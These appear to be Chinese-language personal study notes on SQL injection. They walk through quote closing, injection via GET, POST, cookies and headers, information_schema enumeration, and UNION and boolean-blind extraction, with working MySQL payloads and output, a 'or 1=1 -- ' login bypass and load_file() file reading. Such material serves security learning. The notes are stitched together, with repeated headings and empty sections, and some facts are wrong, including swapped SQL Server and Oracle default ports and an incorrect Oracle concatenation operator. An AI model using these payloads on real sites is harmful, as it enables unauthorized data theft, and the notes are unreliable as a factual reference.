# SQL注入

# 大纲

![image-20240103124002811](images/%E5%B0%8F%E8%BF%AASQL%E6%B3%A8%E5%85%A5.assets/image-20240103124002811.png)



# 数据类型

在进行sql注入的时候，需要判断字符的类型，或者说，是寻找引号/括号的闭合点。

## 数字型

数字型的字段在查询的时候，可以使用引号或者不使用，例如，下面三条语句是等价的。

所以我们如果判断出来一个字段是数字型，也要去判断sql语句的闭合点，一个数字型字段也可以使用引号。

```
mysql> select * from user;
+----+----------+----------+
| id | name     | password |
+----+----------+----------+
|  1 | xiaoshae | xiaoshae |
|  2 | zhangsan | zhangsan |
+----+----------+----------+
2 rows in set (0.02 sec)

mysql> select * from user where id = 1;  #没有引号
mysql> select * from user where id = '1';  #单引号
mysql> select * from user where id = "1";  #双引号   注意: id = '1"  这是一条非法的sql语句
+----+----------+----------+
| id | name     | password |
+----+----------+----------+
|  1 | xiaoshae | xiaoshae |
+----+----------+----------+
1 row in set (0.02 sec)
```

## 字符型

字符型的数据，在搜索的时候必须使用引号，所有必须去判断闭合点，也要判断sql语句使用的是双引号还是单引号。

看如下sql语句

```
mysql> select * from user;
+----+----------+----------+
| id | name     | password |
+----+----------+----------+
|  1 | xiaoshae | xiaoshae |
|  2 | zhangsan | zhangsan |
+----+----------+----------+


mysql> select * from user where name = 'xiaoshae';  #使用单引号
mysql> select * from user where name = "xiaoshae";  #使用双引号
mysql> select * from user where name = 'xiaoshae";  #这条sql语句是非法的
+----+----------+----------+
| id | name     | password |
+----+----------+----------+
|  1 | xiaoshae | xiaoshae |
+----+----------+----------+
1 row in set (0.02 sec)
```



## 搜索型

搜索型本质上也是字符型的一种，只不过sql语句不适用“等于（=）”进行数据的精准匹配，而是使用例如like关键字的模糊匹配

请看如下sql语句

```
mysql> select * from user;
+----+-----------+-----------+
| id | name      | password  |
+----+-----------+-----------+
|  1 | xiaoshae  | xiaoshae  |
|  2 | zhangsan  | zhangsan  |
|  3 | wangshang | wangshang |
+----+-----------+-----------+
3 rows in set (0.02 sec)

mysql> select * from user where name like '%sha%';   #这里使用like关键字进行模糊搜索
mysql> select * from user where name like '%sha%' and 1 = 1;  #like关键字也可以与and进行“与运算”
+----+-----------+-----------+
| id | name      | password  |
+----+-----------+-----------+
|  1 | xiaoshae  | xiaoshae  |
|  3 | wangshang | wangshang |
+----+-----------+-----------+
2 rows in set (0.02 sec)
```



# 提交方法

http协议有多种提交方法传递参数，不同传递参数的方式，发送和接受参数必须使用同个提交方法，若服务端通过get方式接受参数，客户端使用post方式传递参数，则服务端则无法接收到客户端传递过来的参数，自然也无法进行sql注入

## GET or POST

get查询方式，是指参数通过get请求的方式进行传参，数据包含在url中

![image-20231017215942975](images/%E5%B0%8F%E8%BF%AASQL%E6%B3%A8%E5%85%A5.assets/image-20231017215942975.png)

尝试进行简单的SQL注入

![image-20231017221042672](images/%E5%B0%8F%E8%BF%AASQL%E6%B3%A8%E5%85%A5.assets/image-20231017221042672.png)



同一个网页，尝试通过POST传递参数，服务端无法正常的接受参数

![image-20231017221126253](images/%E5%B0%8F%E8%BF%AASQL%E6%B3%A8%E5%85%A5.assets/image-20231017221126253.png)



通过GET传输参数时，只能传输GET中的参数，通过POST传输参数时，则可以同时传输POST和GET参数，例如:

![image-20231017221342489](images/%E5%B0%8F%E8%BF%AASQL%E6%B3%A8%E5%85%A5.assets/image-20231017221342489.png)



当然也有的网页设计的，既可以通过GET接受参数，也可以通过POST接受参数，此时进行SQL注入时，无论通过GET还是POST传输参数都可以





## COOKIE

COOKIE是一种小型的文本文件，用于辨认用户的身份标识，在用户输入密码登录后，在本机上存储用户的身份表示，下次登录就无需再次输入账号密码了。

有时网站的开发者，对POST或GET进行了严格的过滤，无法进行SQL注入，但是没有对COOKIE进行过滤，此时我们就可以考虑通过COOKIE提交参数来进行SQL注入

正常情况下，使用POST提交参数，无法进行SQL注入

![image-20231018142911622](images/%E5%B0%8F%E8%BF%AASQL%E6%B3%A8%E5%85%A5.assets/image-20231018142911622.png)

尝试使用COOKIE提交参数，注入成功！

![image-20231018143150325](images/%E5%B0%8F%E8%BF%AASQL%E6%B3%A8%E5%85%A5.assets/image-20231018143150325.png)



## REQUEST





## HTTP HEADTER

http headter是指http头部，其中包含的信息是告知web服务器，用户当前的一些信息（例如：浏览器版本、系统版本、使用语言等）

下面是一个http的头部信息

![image-20231018144507882](images/%E5%B0%8F%E8%BF%AASQL%E6%B3%A8%E5%85%A5.assets/image-20231018144507882.png)

有些网站，会将http headter中的一些信息存储到数据库中，或者将内容在数据库中进行查询，凡是只要和数据库进行交互，就有可能存在SQL注入



# WAF绕过



# 数据库类型



## MYSQL >= 5.0

此方法仅适用于MYSQL5.0及以上版本

### 数据库名、表名、字段名，字段类型，字段注释

在MYSQL5.0以上的版本中，有一个数据库名为information_schema，在该数据库中有几张表存储了所有数据库名，表名，字段名，字段类型等信息。



```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| user               |
+--------------------+
5 rows in set (0.04 sec)

mysql> show tables;   #例举出几张有用的表
COLUMNS

mysql> desc columns;
+--------------------------+---------------------+------+-----+---------+-------+
| Field                    | Type                | Null | Key | Default | Extra |
+--------------------------+---------------------+------+-----+---------+-------+
| TABLE_CATALOG            | varchar(512)        | NO   |     |         |       |
| TABLE_SCHEMA             | varchar(64)         | NO   |     |         |       |
| TABLE_NAME               | varchar(64)         | NO   |     |         |       |
| COLUMN_NAME              | varchar(64)         | NO   |     |         |       |
| ORDINAL_POSITION         | bigint(21) unsigned | NO   |     | 0       |       |
| COLUMN_DEFAULT           | longtext            | YES  |     | NULL    |       |
| IS_NULLABLE              | varchar(3)          | NO   |     |         |       |
| DATA_TYPE                | varchar(64)         | NO   |     |         |       |
| CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |
| CHARACTER_OCTET_LENGTH   | bigint(21) unsigned | YES  |     | NULL    |       |
| NUMERIC_PRECISION        | bigint(21) unsigned | YES  |     | NULL    |       |
| NUMERIC_SCALE            | bigint(21) unsigned | YES  |     | NULL    |       |
| DATETIME_PRECISION       | bigint(21) unsigned | YES  |     | NULL    |       |
| CHARACTER_SET_NAME       | varchar(32)         | YES  |     | NULL    |       |
| COLLATION_NAME           | varchar(32)         | YES  |     | NULL    |       |
| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |
| COLUMN_KEY               | varchar(3)          | NO   |     |         |       |
| EXTRA                    | varchar(30)         | NO   |     |         |       |
| PRIVILEGES               | varchar(80)         | NO   |     |         |       |
| COLUMN_COMMENT           | varchar(1024)       | NO   |     |         |       |
| GENERATION_EXPRESSION    | longtext            | NO   |     | NULL    |       |
+--------------------------+---------------------+------+-----+---------+-------+
21 rows in set (0.06 sec)

#table_schema 数据库名
#table_name   数据库表明
#column_name  字段名
#data_type    数据类型
#CHARACTER_MAXIMUM_LENGTH   数据类型最大长度
#CHARACTER_SET_NAME  字符类型
#COLLATION_NAME 字符类型校对
#COLUMN_DEFAULT 默认数据

mysql> select table_schema,table_name,column_name,CHARACTER_MAXIMUM_LENGTH,CHARACTER_SET_NAME,COLLATION_NAME from columns where table_schema = 'user';
+--------------+------------+-------------+--------------------------+--------------------+----------------+
| table_schema | table_name | column_name | CHARACTER_MAXIMUM_LENGTH | CHARACTER_SET_NAME | COLLATION_NAME |
+--------------+------------+-------------+--------------------------+--------------------+----------------+
| user         | User       | ID          | NULL                     | NULL               | NULL           |
| user         | User       | name        |                      255 | utf8               | utf8_bin       |
| user         | User       | password    |                      255 | utf8               | utf8_bin       |
| user         | User       | notes       |                      255 | utf8               | utf8_bin       |
+--------------+------------+-------------+--------------------------+--------------------+----------------+
4 rows in set (0.04 sec)
```



## MYSQL信息收集常用函数

### 系统信息获取函数

- `system_user()`：系统用户名
- `user()`：用户名
- `current_user()`：当前用户名
- `session_user()`：链接数据库的用户名
- `database()`：数据库名
- `version()`：数据库版本
- `@@datadir`：数据库路径
- `@@basedir`：数据库安装路径
- `@@version_conpile_os`：操作系统

```
mysql> select system_user(),user(),current_user(),session_user(),database();
+-------------------+-------------------+----------------+-------------------+--------------------+
| system_user()     | user()            | current_user() | session_user()    | database()         |
+-------------------+-------------------+----------------+-------------------+--------------------+
| root@10.10.10.100 | root@10.10.10.100 | root@%         | root@10.10.10.100 | information_schema |
+-------------------+-------------------+----------------+-------------------+--------------------+
1 row in set (0.03 sec)

mysql> select @@datadir,@@basedir,@@version_compile_os;
+-----------------+-----------+----------------------+
| @@datadir       | @@basedir | @@version_compile_os |
+-----------------+-----------+----------------------+
| /var/lib/mysql/ | /usr/     | Linux                |
+-----------------+-----------+----------------------+
1 row in set (0.03 sec)
```



### 字符串处理函数

- `concat()`：没有分隔符的链接字符串
- `concat_ws()`：含有分隔符的连接字符串
- `group_concat()`：连接一个组的所有字符串，并以逗号分隔每一条数据
- `ascii()`：字符串的ASCII代码值
- `ord()`：返回字符串第一个字符的ASCII值
- `mid()`：返回一个字符串的一部分
- `substr()`：返回一个字符串的一部分
- `length()`：返回字符串的长度
- `left()`：返回字符串最左面几个字符
- `char()`：返回整数ASCII代码字符组成的字符串
- `strcmp()`：比较字符串内容

#### 字符串处理函数使用场景

```
#length函数
假设server后端的插入语句为
mysql> select name from user.User where id = {x};

注入语句可以这么写
1 and 1=2 union select length(column_name) from information_schema.columns where table_schema = 'user' and table_name = 'User' limit 0,1;

结合后的效果
select name from user.User where id = 1 and 1=2 union select length(column_name) from information_schema.columns where table_schema = 'user' and table_name = 'User' limit 0,1;

mysql> select name from user.User where id = 1 and 1=2 union select length(column_name) from information_schema.columns where table_schema = 'user' and table_name = 'User' limit 0,1;
+------+
| name |
+------+
| 2    |
+------+
1 row in set (0.03 sec)

由此可知 user 数据库中 User 数据表中的第一个字段名称的长度为2

#使用二分法   判断user数据库中 User 数据表 中 第一个字段名称的  第一个字符是否为 小写

mysql> select name from user.User where id = 1 and 1=2 union select ascii(substr(column_name,1,1)) >=97 from information_schema.columns where table_schema = 'user' and table_name = 'User' limit 0,1;
+------+
| name |
+------+
| 0    |   #不为小写
+------+
1 row in set (0.03 sec)


mysql> select name from user.User where id = 1 and 1=2 union select ascii(substr(column_name,1,1)) < 75 from information_schema.columns where table_schema = 'user' and table_name = 'User' limit 0,1;
+------+
| name |
+------+
| 1    |
+------+
1 row in set (0.03 sec)

mysql> select name from user.User where id = 1 and 1=2 union select ascii(substr(column_name,1,1)) < 73 from information_schema.columns where table_schema = 'user' and table_name = 'User' limit 0,1;
+------+
| name |
+------+
| 0    |
+------+
1 row in set (0.02 sec)

mysql> select name from user.User where id = 1 and 1=2 union select ascii(substr(column_name,1,1)) < 74 from information_schema.columns where table_schema = 'user' and table_name = 'User' limit 0,1;
+------+
| name |
+------+
| 1    |
+------+

mysql> select name from user.User where id = 1 and 1=2 union select ascii(substr(column_name,1,1)) = 73 from information_schema.columns where table_schema = 'user' and table_name = 'User' limit 0,1;
+------+
| name |
+------+
| 1    |
+------+
1 row in set (0.02 sec)

#最后ascii值为73 表示第一个字符的指为 'I'

```

#### 字符串处理函数部分函数介绍

```
#substr函数   第一个字符从1开始计算
#用法:substr(字符串/整形,从n开始,获取n个)
#例子:
mysql> select substr("abcd",1,1);
+--------------------+
| substr("abcd",1,1) |
+--------------------+
| a                  |
+--------------------+
1 row in set (0.02 sec)

mysql> select substr("abcd",2,2);
+--------------------+
| substr("abcd",2,2) |
+--------------------+
| bc                 |
+--------------------+
1 row in set (0.02 sec)

mysql> select substr(123,2,1);
+-----------------+
| substr(123,2,1) |
+-----------------+
| 2               |
+-----------------+
1 row in set (0.02 sec)

#ascii字符串  获取当前字符的ascii值
#用法:ascii(字符/个位整形)
#例子:
mysql> select ascii(0);
+----------+
| ascii(0) |
+----------+
|       48 |
+----------+
1 row in set (0.02 sec)

mysql> select ascii('a');
+------------+
| ascii('a') |
+------------+
|         97 |
+------------+
1 row in set (0.02 sec)

mysql> select ascii('A');
+------------+
| ascii('A') |
+------------+
|         65 |
+------------+
1 row in set (0.02 sec)

#length函数
#用法:length(字符串/整形)
#例子:
mysql> select length(123);
+-------------+
| length(123) |
+-------------+
|           3 |
+-------------+
1 row in set (0.02 sec)

mysql> select length("abcdefg");
+-------------------+
| length("abcdefg") |
+-------------------+
|                 7 |
+-------------------+
1 row in set (0.02 sec)
```

## SQL Server数据库

# 注入拓展



# 回显/盲注



# 防御方案



# SQL注入

# SQL注入基本步骤

## 1.寻找注入点

> SQL注入点是指在Web应用程序中，用户输入的数据被包含在SQL查询中，而没有适当地进行过滤或转义，从而允许攻击者操纵这些查询

SQL注入点一般可能出现在以下地方：

- GET请求中的参数部分
- POST请求中的参数部分
- HTTP头部注入（User-Agent、Host、Cookie等字段）

这些地方都是因为服务端可能会将这些数据存入数据库中，攻击者可以将这些数据篡改为攻击语句。



### 2.判断对方版本等信息





## 3.注入类型

### 联合查询注入（回显）

使用UNION操作符将攻击者的查询与原始查询合并，从而获取数据库中的信息

```
#正常的查询
mysql> select * from user where id = 1;
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.02 sec)

# 表 user 的全部内容
mysql> select * from user;
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
|  2 | LiSa     | PDLiSa     | NONE  |
|  3 | Amaomao  | PDAmaomao  | NONE  |
+----+----------+------------+-------+
3 rows in set (0.02 sec)

# 表 info_user 的全部内容
mysql> select * from info_user;
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
|  2 | LiSa     | PDLiSa     | NONE  |
|  3 | Amaomao  | PDAmaomao  | NONE  |
+----+----------+------------+-------+
3 rows in set (0.02 sec)

# 如果此处存在回显SQL注入点，则可以使用union all联合查询其他数据库和数据表的信息
mysql> select * from user where id = 1 union all select * from info_user;
+----+----------+------------+-------+
| id | name     | password   | notes 
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
|  1 | ZhangSan | PDZhangSan | NONE  |
|  2 | LiSa     | PDLiSa     | NONE  |
|  3 | Amaomao  | PDAmaomao  | NONE  |
+----+----------+------------+-------+
4 rows in set (0.02 sec)
```



### 报错注入

通过构造会导致数据库错误的查询，从错误信息中获取数据库中的信息

### 时间延迟注入

通过在查询中插入如SLEEP()这样的函数，根据页面响应时间的长短来判断查询条件是否成立	

### 布尔型注入

Web的页面的仅仅会返回True和False。那么布尔盲注就是进行SQL注入之后然后根据页面返回的True或者是False来得到数据库中的相关信息。（boolean值只能是true和false）



#### 基本原理

```
#假设这里查询到了返回true（虽然数据库中返回了数据，但是web只会显示bool），没有查询到返回false
mysql> select * from user where id = 1;
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.02 sec)


#此事我们可以在后面加上and，括号中使用我们需要判断的语句
mysql> select * from user where id = 1 and (1);
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.02 sec)

#如果此处的name第一条为'ZhangSan'则返回true，否则返回false
mysql> select * from user where id = 1 and ((select name from user limit 0,1) = 'ZhangSan');
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.02 sec)

```



#### 获取数据库名称

```
#获取当前数据库名称长度 最后得到数据库名称长度为4
mysql> select * from user where id = 1 and (length(database()) = 1);
Empty set

mysql> select * from user where id = 1 and (length(database()) = 2);
Empty set

mysql> select * from user where id = 1 and (length(database()) = 3);
Empty set

mysql> select * from user where id = 1 and (length(database()) = 4);
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.02 sec)

#获取当前数据库名称第一个字符，判断是不是为 'u'
mysql> select * from user where id = 1 and (substr(database(),1,1) = 'u');
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.02 sec)

#判断第二个字符是不是 's'   剩下的不过多介绍，可以使用二分法
mysql> select * from user where id = 1 and (substr(database(),2,1) = 's');
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.02 sec)
```



#### 获取数据库表数量和名称

```
#获取表数量，这里表的数量为2
mysql> select * from user where id = 1 and (select count(table_name) from information_schema.tables where table_schema = database()) = 1;
Empty set

mysql> select * from user where id = 1 and (select count(table_name) from information_schema.tables where table_schema = database()) = 2;
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.02 sec)

#获取表的名称   判断第一表的第一个字符是不是为 'i'
mysql> select * from user where id = 1 and (substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) = 'i';
+----+----------+------------+-------+
| id | name     | password   | notes |
+----+----------+------------+-------+
|  1 | ZhangSan | PDZhangSan | NONE  |
+----+----------+------------+-------+
1 row in set (0.03 sec)
```



#### 获取列名的方法不再一一介绍（可参考扩展information_schema）



# 扩展

## information_schema数据库中的三张表（schemata、tables、columns）

### schemata

| 列名                       | 类型         | 描述                                           |
| :------------------------- | :----------- | :--------------------------------------------- |
| CATALOG_NAME               | varchar(512) | 表所在的目录的名称。在MySQL中，这个值总是`def` |
| SCHEMA_NAME                | varchar(64)  | 数据库名                                       |
| DEFAULT_CHARACTER_SET_NAME | varchar(32)  | 数据库默认字符集名称                           |
| DEFAULT_COLLATION_NAME     | varchar(32)  | 数据库默认排序规则名称                         |
| SQL_PATH                   | varchar(512) | SQL路径                                        |



### tables

| 列名            | 类型                | 描述                                           |
| :-------------- | :------------------ | :--------------------------------------------- |
| TABLE_CATALOG   | varchar(512)        | 表所在的目录的名称。在MySQL中，这个值总是`def` |
| TABLE_SCHEMA    | varchar(64)         | 表所在的数据库的名称                           |
| TABLE_NAME      | varchar(64)         | 表名                                           |
| TABLE_TYPE      | varchar(64)         | 表类型                                         |
| ENGINE          | varchar(64)         | 存储引擎                                       |
| VERSION         | bigint(21) unsigned | 版本号                                         |
| ROW_FORMAT      | varchar(10)         | 行格式                                         |
| TABLE_ROWS      | bigint(21) unsigned | 表中的行数                                     |
| AVG_ROW_LENGTH  | bigint(21) unsigned | 平均行长度                                     |
| DATA_LENGTH     | bigint(21) unsigned | 数据长度                                       |
| MAX_DATA_LENGTH | bigint(21) unsigned | 最大数据长度                                   |
| INDEX_LENGTH    | bigint(21) unsigned | 索引长度                                       |
| DATA_FREE       | bigint(21) unsigned | 数据空闲空间                                   |
| AUTO_INCREMENT  | bigint(21) unsigned | 自动递增值                                     |
| CREATE_TIME     | datetime            | 创建时间                                       |
| UPDATE_TIME     | datetime            | 更新时间                                       |
| CHECK_TIME      | datetime            | 检查时间                                       |
| TABLE_COLLATION | varchar(32)         | 表排序规则名称                                 |
| CHECKSUM        | bigint(21) unsigned | 校验和                                         |
| CREATE_OPTIONS  | varchar(255)        | 创建选项                                       |
| TABLE_COMMENT   | varchar(2048)       | 表注释                                         |



### columns

| 列名                     | 类型                | 描述                                                         |
| :----------------------- | :------------------ | :----------------------------------------------------------- |
| TABLE_CATALOG            | varchar(512)        | 表所在的目录的名称。在MySQL中，这个值总是`def`               |
| TABLE_SCHEMA             | varchar(64)         | 表所在的数据库的名称                                         |
| TABLE_NAME               | varchar(64)         | 表名                                                         |
| COLUMN_NAME              | varchar(64)         | 列名                                                         |
| ORDINAL_POSITION         | bigint(21) unsigned | 列在表中的位置（从1开始）                                    |
| COLUMN_DEFAULT           | longtext            | 列的默认值                                                   |
| IS_NULLABLE              | varchar(3)          | 如果列可以包含NULL，该值为“YES”，否则为“NO”                  |
| DATA_TYPE                | varchar(64)         | 列的数据类型                                                 |
| CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | 字符列的最大长度（以字符为单位）                             |
| CHARACTER_OCTET_LENGTH   | bigint(21) unsigned | 字符列的最大长度（以字节为单位）                             |
| NUMERIC_PRECISION        | bigint(21) unsigned | 数字列的精度。对于浮点和双精度类型，这是精度值。对于整数类型，这是长度值 |
| NUMERIC_SCALE            | bigint(21) unsigned | 小数点右边的数字位数                                         |
| DATETIME_PRECISION       | bigint(21) unsigned | datetime类型列的子秒精度                                     |
| CHARACTER_SET_NAME       | varchar(32)         | 字符列的字符集名称                                           |
| COLLATION_NAME           | varchar(32)         | 字符列的排序规则名称                                         |
| COLUMN_TYPE              | longtext            | 列的数据类型，包括长度或值范围                               |
| COLUMN_KEY               | varchar(3)          | 如果列是索引键中的一部分，则为“PRI”（主键）、“UNI”（唯一键）或“MUL”（多键） |
| EXTRA                    | varchar(30)         | 任何额外信息，如auto_increment                               |
| PRIVILEGES               | varchar(80)         | 该列具有哪些权限                                             |
| COLUMN_COMMENT           | varchar(1024)       | 列注释                                                       |
| GENERATION_EXPRESSION    | longtext            | 如果该列是生成列，则此字段包含生成列表达式；否则，此字段为空字符串 |



### 一个示例

```
mysql> select table_schema as DatabaseName,table_name as TableName,column_name as ColumnName,data_type as Type,character_maximum_length as Length,character_set_name as CharName,collation_name as CollateName from information_schema.columns where table_schema = 'user' and table_name = 'user' ;
+--------------+-----------+------------+---------+--------+----------+-------------+
| DatabaseName | TableName | ColumnName | Type    | Length | CharName | CollateName |
+--------------+-----------+------------+---------+--------+----------+-------------+
| user         | user      | id         | int     | NULL   | NULL     | NULL        |
| user         | user      | name       | varchar |    125 | utf8mb4  | utf8mb4_bin |
| user         | user      | password   | varchar |    198 | utf8mb4  | utf8mb4_bin |
| user         | user      | notes      | varchar |    253 | utf8mb4  | utf8mb4_bin |
+--------------+-----------+------------+---------+--------+----------+-------------+
4 rows in set (0.02 sec)
```



# 数据库

## 概述

- 数据库（DataBse，DB）：保存在存储设备上、按照一定结构组织在一起的相关数据的集合。
- 数据库管理系统（DataBase Management System，DBMS）：操作和管理数据库的软件，用于建立、使用和维护数据库。
- 数据库系统（DataBase System,DBS）：由数据库和数据库管理系统组成。



## 分类

- 关系型数据库：关系型数据库模型是把复杂的数据结构归结为简单的二元关系(即二维表格)
    - 典型产品：MySQL、Microsoft SQL Server、Oracle、PostgreSQL、IBM DB2、Access等
- 非关系型数据库：也被称为"NOSQL"数据库，本意是"Not Only SQL"，作为传统关系型数据库的一个有效补，在特定的场景下可以发挥出难以想象的高效率和高性能。
    - 典型产品：Memcached、Redis、mongoDB



## 默认端口

- MySQL：3306
- SQL Server：1521
- Oracle：1433
- PostgreSQL：5432
- Memcached：11211
- Redis：6379
- mongoDB：27017



# MySQL连接方式

```
mysql -h x.x.x.x -u root -p
mysql -h x.x.x.x -P [port] -u root -p
mysql -h x.x.x.x -u root -p[PassWord]
```



# 识别数据库方法

- 盲跟踪
    - web应用技术
- 不同数据库SQL语句差异
    - 非盲跟踪
    - 报错、直接查询



## web语言

不同的web编程语言有其最佳适配的数据库，这几种数据库搭配起来使用更方便，其效率更高。

常见的搭配

ASP和.NET：MSSQL

PHP：MySQL、PostgreSQL

Java：Oracle、MySQL



## Nmap扫描

![image-20231209104044360](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231209104044360.png)



## 报错信息

故意提交错误的内容导致数据库报错回显，通过报错内容来判断数据库

### MySQL

![image-20231209104205372](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231209104205372.png)

### MSSQL

![image-20231209104223474](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231209104223474.png)

### Oracle

![image-20231209104237807](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231209104237807.png)



## SQL查询版本

MSSQL

```sql
select @@version
```

MySQL

```sql
select version()
select @@version
```

Oracle

```sql
select banner from v$version
#select v$version.banner
```

PostgreSQL

```sql
select version(）
```



# 字符串处理

## MSSQL

长度

```sql
len('abc') #3
```

截取左右

```sql
left('abc',2)  #'ab'
right('abc',2) #'bc'
```

截取中间

```sql
substring('abc',2,1) #'b'
```

字符串连接

```sql
'ab'+'cd'+'ef' #'abcdef'
```



## MySQL

长度

```sql
length('abc') #3
```

截取左右

```sql
left('abc',2)  #'ab'
right('abc',2) #'bc'
```

截取中间

```sql
substring('abc',2,1) #'b'
mid('abc',2,1) #'b'
```

字符串连接

```sql
concat('ab','cd','ef') #'abcdef'
```





## Access

长度

```sql
len('abc') #3
```

截取左右

```sql
left('abc',2)  #'ab'
right('abc',2) #'bc'
```

截取中间

```sql
mid('abc',2,1) #'b'
```

字符串连接

```sql
'ab'&'cd'&'ef' #'abcdef'
```



## Oracle

长度

```sql
lenght('abc') #3
```

截取左右

```sql
#使用截取中间的substr
```

截取中间

```sql
substr('abc',2,1) #'b'
```

字符串连接

```sql
'ab'&'cd'&'ef' #'abcdef'
```



# 注入常用语法

## order by

order by是在select输出后，指定一个列来进行排序，通过order by语法可以来判断当前数据表有多少列。

![image-20231211084626304](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231211084626304.png)

使用order by从1开始尝试，直到一个报错的数字，即表示该数字减1为数据表列数。

![image-20231211084745394](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231211084745394.png)





## limit

`select id,name from user limit 2;`

无论查询到多少条数据，最多返回2条数据。



`select id,name from user limit 2,1;`

从第2（3）条数据开始，最多返回1条数据。



limit可以指定从查询结果的n条开始，返回m条数据。

![image-20231211085659466](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231211085659466.png)



## union

MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。

UNION 操作符必须由两个或多个 SELECT 语句组成，每个 SELECT 语句的列数和对应位置的数据类型必须相同。



![image-20231211085928691](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231211085928691.png)

可以通过union泄露mysql中的其他表。

![image-20231211090604912](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231211090604912.png)

## load_file()函数

load_file()函数用于读取服务器文件内容

![image-20231211092921740](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231211092921740.png)



# information_schema

![image-20231211092145009](images/SQL%E6%B3%A8%E5%85%A5.assets/image-20231211092145009.png)



# 手工SQL注入

## 1.判断是否存在注入点

### 万能密码登录

通过在用户名处传入参数，`or 1=1 -- '`进行万能密码登录

注意：`-- '`有一个空格



## 2.判断字段长度（字段数）





## 3.判断字段回显位置



## 4.判断数据库信息



## 5.查询数据库信息（表名，列名）



## 6.查询所有字段和字段值

